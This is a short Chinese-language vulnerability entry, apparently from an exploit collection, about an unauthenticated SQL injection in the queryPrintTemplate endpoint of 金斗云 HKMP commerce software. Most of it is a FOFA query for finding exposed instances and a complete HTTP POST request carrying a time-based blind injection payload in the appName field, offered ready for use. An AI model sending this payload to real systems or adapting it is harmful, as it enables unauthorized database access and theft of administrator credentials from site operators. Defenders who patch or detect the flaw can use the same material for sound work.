# 金斗云HKMP智慧商业软件queryPrintTemplate存在SQL注入漏洞

金斗云HKMP智慧商业软件queryPrintTemplate存在SQL注入漏洞，未经身份验证攻击者可通过该漏洞数据库数据，如管理员账户密码等。

## fofa

```yaml
body="金斗云 Copyright"
```

## poc

```java
POST /admin/configApp/queryPrintTemplate HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/json

{"appId":"hkmp","data":{"adminUserCode":"test1234","adminUserName":"test1234","appName":"悟空POS Win版' AND (SELECt 5 from (select(sleep(2)))x) and 'zz'='zz","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}
```

